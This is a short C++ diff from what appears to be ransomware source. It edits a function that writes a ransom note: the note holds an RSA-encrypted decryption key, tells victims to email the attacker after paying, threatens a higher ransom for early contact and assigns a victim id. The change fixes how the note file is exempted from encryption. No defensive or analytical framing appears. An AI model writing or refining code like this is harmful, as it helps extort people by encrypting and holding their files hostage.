@@ -246,9 +246,6 @@ namespace dune
             note += "DO NOT MODIFY THIS OR ALL YOUR FILES WILL BE LOST (It is the RSA encrypted key for decryption)\n\n" + base64_encode((unsigned char *)(encrypted_key.data()), encrypted_key.length()) + "\n\n";
             note += "Send this whole file to this email address AFTER you have paid the ransom: " + hacker_email + "\n\nIf you contact this email before the ransom is paid in full it will likely be increased.\n\n\n";
             note += "This is your victim id: " + generate_uuid() + ".\n";
-            std::string exempt_hash;
-            dune::crypto::Compute_SHA_256(note, &exempt_hash);
-            exempt_files.push_back(exempt_hash);
             int success = 0;
             for (int i = 0; i < user_notes_locations.size(); i++)
             {
@@ -266,6 +263,7 @@ namespace dune
                 {
                 }
             }
+            exempt_files.push_back(compute_file_hash(user_notes_locations[0]));
             return success;
         }
     };
